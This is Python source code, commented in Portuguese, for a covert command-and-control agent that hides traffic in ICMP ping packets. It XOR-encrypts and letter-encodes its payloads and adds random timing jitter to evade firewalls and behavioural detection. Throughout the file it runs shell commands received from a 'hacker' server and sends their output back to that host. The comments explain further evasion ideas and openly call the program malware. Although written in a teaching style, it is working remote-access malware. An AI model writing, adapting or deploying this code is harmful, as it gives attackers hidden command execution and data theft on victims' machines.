# ==================================================================================
# AGENTE C2 FURTIVO (ICMP + XOR + ENCODING + JITTER)
# ==================================================================================

# --- BIBLIOTECAS ---
import socket      
import struct      
import time       
import subprocess   
import sys        
import random      

# --- CONFIGURAÇÕES ---
HACKER_IP = "127.0.0.1"  # IP do Servidor C2 (Hacker). Em um ataque real, seria um IP público/nuvem. 
                         # Além disso seria enviado para uns 50 servidores cada um com um pequeno pedaçao dos dados para evitar detecção.
CHAVE_XOR = 0xAA         # A chave usada para criptografar os dados. 0xAA em binário é 10101010.
                         # O XOR é usado porque é rápido e fácil de reverter (A ^ B = C -> C ^ B = A).

# O "Alfabeto" usado para a técnica de camuflagem.
# Usei apenas 'a' até 'p' porque isso mapeia exatamente os valores de 0 a 15 (4 bits/Nibble).
# Isso faz o tráfego parecer texto simples ou hex dump, baixando a entropia.
ALFABETO = "abcdefghijklmnop"

# --- CONFIGURAÇÃO DE JITTER ---
# O Jitter é a variação aleatória no tempo de comunicação.
# Se o malware se comunicar exatamente a cada 5.0s, é fácil de detectar.
# Variar entre 3.0s e 10.0s faz parecer comportamento humano ou instabilidade de rede.
# Numa versão real o tempo teria que ser bem mais alto para dificultar detecção.
MIN_SLEEP = 3.0
MAX_SLEEP = 10.0

# --- FUNÇÃO DE CHECKSUM (Soma de Verificação) ---
# O protocolo ICMP EXIGE que o cabeçalho tenha um checksum válido.
# Se esta matemática estiver errada, o roteador ou o OS descarta o pacote silenciosamente.
def checksum(source_string):
    # Se o tamanho dos dados for ímpar, adiciona um byte nulo (\x00) no final (padding),
    # pois o checksum calcula soma de blocos de 16 bits (2 bytes).
    if len(source_string) % 2 != 0: source_string += b'\x00'
    
    sum = 0; count = 0
    # Percorre os dados de 2 em 2 bytes
    while count < len(source_string):
        # Combina 2 bytes num número de 16 bits (High Byte * 256 + Low Byte)
        val = source_string[count + 1] * 256 + source_string[count]
        sum = (sum + val) & 0xffffffff; # Soma garantindo limite de 32 bits
        count += 2
    
    # Soma o "carry" (excesso) dos bits mais altos de volta aos bits baixos
    sum = (sum >> 16) + (sum & 0xffff); sum += (sum >> 16)
    
    # Inverte os bits (One's Complement) e garante 16 bits finais
    # O resultado final é trocado de Endianness (Little/Big) para rede.
    return (~sum & 0xffff) >> 8 | ((~sum & 0xffff) << 8 & 0xff00)

# --- TÉCNICA 1: Encoding 'a-p' (Baixa Entropia) ---
# Transforma bytes "feios" (ex: \xF4) em texto "bonito" (ex: 'kp').
# Isso engana firewalls que bloqueiam tráfego binário suspeito.
def encode_fake_ping(dados_bytes):
    payload_texto = ""
    for byte in dados_bytes:
        # Pega os 4 bits da esquerda (High Nibble). Ex: 11110000 -> 1111 (15)
        high = (byte >> 4) & 0x0F
        # Pega os 4 bits da direita (Low Nibble). Ex: 00001111 -> 1111 (15)
        low = byte & 0x0F
        
        # Converte os números (0-15) em letras (a-p) usando o índice da string ALFABETO
        payload_texto += ALFABETO[high] + ALFABETO[low]
    
    # Retorna como bytes prontos para envio
    return payload_texto.encode('utf-8')

# Função inversa para ler os dados enviados pelo kiddie
def decode_fake_ping(dados_texto):
    try:
        # Tenta converter bytes recebidos para string
        texto = dados_texto.decode('utf-8')
    except: return None # Se falhar, não é um pacote nosso
    
    bytes_reconstruidos = bytearray()
    # Lê de 2 em 2 letras
    for i in range(0, len(texto), 2):
        if i+1 >= len(texto): break
        try:
            # Acha a posição da letra no alfabeto (ex: 'a' -> 0, 'b' -> 1)
            high = ALFABETO.index(texto[i])
            low = ALFABETO.index(texto[i+1])
            
            # Reconstrói o byte original deslocando bits (High << 4 | Low)
            bytes_reconstruidos.append((high << 4) | low)
        except: return None
    return bytes_reconstruidos

# --- TÉCNICA 2: Criptografia XOR ---
# Ofusca o conteúdo para esconder palavras-chave como "cmd" ou "password".
def xor_data(data):
    # Para cada byte 'b' nos dados, faz a operação XOR (^) com a CHAVE_XOR.
    return bytes([b ^ CHAVE_XOR for b in data])

# --- MONTAGEM DO PACOTE ---
def create_packet(payload_str):
    # 1. Normalização: Garante que a string virou bytes
    if isinstance(payload_str, str): payload_str = payload_str.encode('utf-8')
    
    # 2. Criptografia: Aplica XOR (payload fica ilegível/alta entropia)
    payload_xor = xor_data(payload_str)
    
    # 3. Camuflagem: Aplica Encoding (payload vira texto 'a-p'/baixa entropia)
    payload_camuflado = encode_fake_ping(payload_xor)
    
    # Monta um cabeçalho "dummy" (falso) com checksum 0 para calcular o real.
    # Struct 'bbHHh':
    # b (1 byte) = Type (8 para Echo Request)
    # b (1 byte) = Code (0)
    # H (2 bytes) = Checksum (0 inicial)
    # H (2 bytes) = ID (1 arbitrário)
    # h (2 bytes) = Sequence (1 arbitrário)
    header = struct.pack('bbHHh', 8, 0, 0, 1, 1)
    
    # Calcula o checksum sobre o Header + Payload Camuflado
    chk = checksum(header + payload_camuflado)
    
    # Recria o cabeçalho agora com o checksum correto (socket.htons garante a ordem dos bytes da rede)
    header = struct.pack('bbHHh', 8, 0, socket.htons(chk), 1, 1)
    
    # Retorna o pacote pronto: Cabeçalho ICMP + Dados Escondidos
    return header + payload_camuflado

# --- EXECUÇÃO DE COMANDOS (O "Músculo" do C2) ---
def executar_comando(cmd):
    try:
        # subprocess.run roda o comando no shell do sistema.
        # capture_output=True: Guarda o que o comando respondeu.
        # text=True: Já traz o resultado como string, não bytes.
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        # Junta stdout (sucesso) e stderr (erros)
        output = result.stdout + result.stderr
        if not output: output = "(Sem output)"
        return output
    except Exception as e:
        return f"Erro: {e}"

# --- LOOP PRINCIPAL ---
def main():
    try:
        # Cria o RAW SOCKET.
        # AF_INET = IPv4
        # SOCK_RAW = Acesso direto ao protocolo, sem camada de transporte (TCP/UDP) automática.
        # IPPROTO_ICMP = Especifica que vamos falar a língua do Ping.
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        
        # Define um timeout. Se o recvfrom() não receber nada em 3s, ele solta uma exceção.
        # Isso impede que o programa trave para sempre esperando resposta.
        sock.settimeout(3)
    except:
        # Raw Sockets exigem Root/Admin. Se falhar, avisa e sai.
        sys.exit("Erro: Use SUDO.")

    print("AGENTE FURTIVO ATIVO. Modo: Camaleão + Jitter.")

    # Loop infinito: O malware roda para sempre até ser desligado.
    while True:
        try:
            # --- PASSO 1: Beacon / Heartbeat ---
            # Envia um pacote dizendo "Estou vivo".
            # Usa a função create_packet para criptografar e camuflar essa mensagem.
            sock.sendto(create_packet("HEARTBEAT"), (HACKER_IP, 1))

            # --- PASSO 2: Esperar Ordens ---
            try:
                # O buffer 65535 é o tamanho máximo teórico de um pacote IP.
                raw_data, _ = sock.recvfrom(65535)
                
                # Dissecação do pacote recebido:
                # Bytes 0-20: Cabeçalho IP (Não queremos)
                # Bytes 20-28: Cabeçalho ICMP (Não queremos)
                # Bytes 28+: Payload (A mensagem do kiddie)
                payload_camuflado = raw_data[28:]

                # 1. Decodifica o Camaleão (transforma letras 'a-p' em bytes criptografados)
                payload_cifrado = decode_fake_ping(payload_camuflado)
                
                if payload_cifrado:
                    # 2. Remove a Criptografia XOR (revela o texto original)
                    mensagem = xor_data(payload_cifrado).decode('utf-8', errors='ignore')

                    # Verifica se é um comando do kiddie (Protocolo "CMD:")
                    if mensagem.startswith("CMD:"):
                        comando = mensagem[4:] # Remove o prefixo "CMD:"
                        
                        # --- PASSO 3: Ação ---
                        # Executa o comando no terminal local
                        resultado = executar_comando(comando)
                        
                        # --- PASSO 4: Exfiltração ---
                        # Envia o resultado de volta.
                        # Cortamos [:500] para evitar pacotes gigantes (Jumbo Frames) que alertam firewalls.
                        sock.sendto(create_packet("RES:" + resultado[:500]), (HACKER_IP, 1))
            
            except socket.timeout:
                # Se o kiddie não respondeu em 3s, ignoramos e continuamos o ciclo.
                pass

            # --- TÉCNICA 3: Jitter (Tempo Aleatório) ---
            # Esta é a parte mais importante para evitar detecção comportamental.
            # Sorteia um número float entre 3.0 e 10.0.
            tempo_sono = random.uniform(MIN_SLEEP, MAX_SLEEP)
            
            # Dorme. O computador fica silencioso na rede por esse tempo.
            time.sleep(tempo_sono)

        except KeyboardInterrupt: 
            # Permite parar o script com Ctrl+C
            break
        except Exception: 
            # Se der qualquer outro erro de rede, espera 5s e tenta de novo.
            # Malwares devem ser resilientes e não crashing.
            time.sleep(5)

# Ponto de entrada padrão do Python
if __name__ == "__main__":
    main()